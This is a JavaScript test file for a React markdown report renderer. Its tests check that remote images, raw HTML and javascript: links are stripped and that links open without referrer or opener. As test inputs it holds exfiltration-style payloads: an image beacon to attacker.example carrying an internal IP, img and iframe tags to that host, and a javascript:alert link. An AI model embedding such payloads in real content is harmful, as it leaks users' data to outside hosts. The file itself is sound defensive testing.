import assert from "node:assert/strict";
import test from "node:test";

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

import { reportDisallowedElements, reportMarkdownComponents } from "../src/reportMarkdownOptions.js";

const render = (markdown) => renderToStaticMarkup(createElement(ReactMarkdown, {
  remarkPlugins: [remarkGfm],
  components: reportMarkdownComponents,
  disallowedElements: reportDisallowedElements,
}, markdown));

test("report markdown never emits an element that fetches a remote image", () => {
  const html = render("Beacon ![exfil](http://attacker.example/pixel.png?host=10.1.2.3) seen.\n\n![](https://attacker.example/a.gif)");
  assert.equal(html.includes("<img"), false);
  assert.equal(html.includes("src="), false);
  assert.equal(html.includes("attacker.example"), false);
  assert.match(html, /\[image omitted: exfil\]/);
  assert.match(html, /\[image omitted\]/);
});

test("report links open in a new tab without referrer or opener", () => {
  const html = render("See [vendor advisory](https://example.org/advisory) and https://example.net/auto.");
  const anchors = html.match(/<a [^>]*>/g) || [];
  assert.equal(anchors.length, 2);
  for (const anchor of anchors) {
    assert.match(anchor, /target="_blank"/);
    assert.match(anchor, /rel="noreferrer noopener"/);
  }
  assert.equal(render("[x](javascript:alert(1))").includes("javascript:"), false);
});

test("raw HTML in the report is not rendered as markup", () => {
  const html = render('<img src="http://attacker.example/x.png"> <iframe src="http://attacker.example"></iframe>\n\n| a | b |\n|---|---|\n| 1 | 2 |');
  assert.equal(html.includes("<img"), false);
  assert.equal(html.includes("<iframe"), false);
  assert.match(html, /<table>/);
});
